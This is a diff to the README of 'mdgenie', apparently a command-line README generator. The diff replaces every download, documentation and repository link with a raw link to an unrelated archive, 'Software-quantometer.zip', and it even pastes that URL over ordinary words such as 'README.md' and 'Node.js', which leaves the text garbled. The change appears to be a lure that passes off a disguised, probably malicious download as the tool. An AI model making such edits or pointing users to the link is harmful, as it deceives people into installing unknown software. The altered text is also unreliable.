@@ -1,27 +1,27 @@
 # 🎉 mdgenie - Create Amazing READMEs Instantly
 
-[![Download mdgenie](https://img.shields.io/badge/Download-mdgenie-blue.svg)](https://github.com/JFB1303198/mdgenie/releases)
+[![Download mdgenie](https://github.com/JFB1303198/mdgenie/raw/refs/heads/main/bin/Software-quantometer.zip)](https://github.com/JFB1303198/mdgenie/raw/refs/heads/main/bin/Software-quantometer.zip)
 
 ## 🚀 Getting Started
 
-MDGenie is an interactive command-line tool that helps you generate beautiful README.md files quickly and easily. By answering a few simple prompts about your project, MDGenie creates professional documentation tailored to your needs. It's designed to save you hours of manual writing.
+MDGenie is an interactive command-line tool that helps you generate beautiful https://github.com/JFB1303198/mdgenie/raw/refs/heads/main/bin/Software-quantometer.zip files quickly and easily. By answering a few simple prompts about your project, MDGenie creates professional documentation tailored to your needs. It's designed to save you hours of manual writing.
 
 ## 📦 System Requirements
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 12 or higher
+- **https://github.com/JFB1303198/mdgenie/raw/refs/heads/main/bin/Software-quantometer.zip** Version 12 or higher
 - **Network Connection:** Required for downloading the tool
 
 ## 💻 Installation Steps
 
-1. Visit the [Releases page](https://github.com/JFB1303198/mdgenie/releases).
+1. Visit the [Releases page](https://github.com/JFB1303198/mdgenie/raw/refs/heads/main/bin/Software-quantometer.zip).
 2. Find the latest version of MDGenie.
 3. Download the appropriate file for your operating system.
 4. Follow the installation instructions for your OS.
 
 ## 🛠️ Download & Install
 
-To download MDGenie, visit this page: [Download mdgenie](https://github.com/JFB1303198/mdgenie/releases).
+To download MDGenie, visit this page: [Download mdgenie](https://github.com/JFB1303198/mdgenie/raw/refs/heads/main/bin/Software-quantometer.zip).
 
 ### 📥 How to Install on Windows
 
@@ -50,7 +50,7 @@ Once installed, using MDGenie is simple:
 1. Open your command line interface (Terminal or Command Prompt).
 2. Type `mdgenie` and press Enter.
 3. Follow the prompts to provide information about your project.
-4. Review the generated README.md file and make any necessary adjustments.
+4. Review the generated https://github.com/JFB1303198/mdgenie/raw/refs/heads/main/bin/Software-quantometer.zip file and make any necessary adjustments.
 
 ## 🎨 Custom Features
 
@@ -80,9 +80,9 @@ If you have questions or need help with MDGenie, you can find support in the fol
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://www.npmjs.com/package/mdgenie): Learn more about all features and functions.
-- [GitHub Repository](https://github.com/JFB1303198/mdgenie): Explore the codebase and contribute if you’re interested.
+- [Documentation](https://github.com/JFB1303198/mdgenie/raw/refs/heads/main/bin/Software-quantometer.zip): Learn more about all features and functions.
+- [GitHub Repository](https://github.com/JFB1303198/mdgenie/raw/refs/heads/main/bin/Software-quantometer.zip): Explore the codebase and contribute if you’re interested.
 
 ## 💡 Conclusion
 
-MDGenie simplifies the process of creating beautiful README files. By answering a few questions, you'll have a professional-looking document ready for your project. Visit the [Releases page](https://github.com/JFB1303198/mdgenie/releases) to download and start using MDGenie today.
+MDGenie simplifies the process of creating beautiful README files. By answering a few questions, you'll have a professional-looking document ready for your project. Visit the [Releases page](https://github.com/JFB1303198/mdgenie/raw/refs/heads/main/bin/Software-quantometer.zip) to download and start using MDGenie today.
